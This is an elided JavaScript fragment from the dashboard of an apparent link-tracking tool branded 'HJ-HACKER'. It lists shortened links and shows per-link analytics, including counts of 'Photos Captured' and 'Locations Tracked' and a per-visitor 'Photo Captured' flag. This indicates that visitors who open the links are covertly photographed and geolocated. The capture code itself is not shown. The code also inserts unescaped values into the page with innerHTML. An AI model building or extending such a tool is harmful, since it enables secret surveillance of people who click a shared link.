...
async function shortenUrl() {
    ...
    try {
        ...
        // Refresh recent list to show new link
        loadRecentLinks();
        loadAnalyticsList();
...
// ✅ UPDATED: Recent Links with Analytics Button
    ...
    container.innerHTML = recent.map(link => `
        <div class="recent-item">
            ...
            <div class="recent-actions">
                <button onclick="copyToClipboard('${link.shortUrl}')" class="btn-icon" title="Copy Link">
                    <i class="fas fa-copy"></i>
                </button>
                <button onclick="viewAnalytics('${link.code}')" class="btn-icon" title="View Analytics">
                    <i class="fas fa-chart-line"></i>
                </button>
                <button onclick="window.open('${link.shortUrl}', '_blank')" class="btn-icon" title="Visit Link">
    ...
    try {
        ...
        container.innerHTML = links.map(link => `
            <div class="recent-item">
                ...
                <div class="recent-actions">
                    <button onclick="viewAnalytics('${link.code}')" class="btn-primary" style="width: auto; padding: 8px 16px;">
...
// ✅ Analytics View Function (shows detailed stats)
window.viewAnalytics = async (code) => {
    showToast('Loading', `Fetching analytics for /${code}...`, 'success');
    ...
    try {
        ...
        if (statsGrid) {
            statsGrid.innerHTML = `
                ...
                <div class="stat-card">
                    ...
                    <div class="stat-label"><i class="fas fa-users"></i> Unique Visitors</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">${cameras}</div>
                    <div class="stat-label"><i class="fas fa-camera"></i> Photos Captured</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">${locations}</div>
                    <div class="stat-label"><i class="fas fa-location-dot"></i> Locations Tracked</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">${topBrowser}</div>
                    <div class="stat-label"><i class="fab fa-chrome"></i> Top Browser</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value">${linkData?.clicks || 0}</div>
                    <div class="stat-label"><i class="fas fa-chart-simple"></i> Total Redirects</div>
                </div>
            `;
        }
        ...
        if (visitorsList) {
            if (analytics.length === 0) {
                visitorsList.innerHTML = '<div style="text-align: center; padding: 2rem;"><i class="fas fa-inbox"></i><p>No visitors yet</p></div>';
            } else {
                visitorsList.innerHTML = analytics.map(v => `
                    <div class="visitor-item">
                        ...
                        <div class="visitor-details">
                            ...
                            ${v.captured_image ? `<span><i class="fas fa-camera"></i> <span style="color: #00ff41;">Photo Captured</span></span>` : ''}
...
console.log('🔥 HJ-HACKER Script Loaded with Analytics Button!');
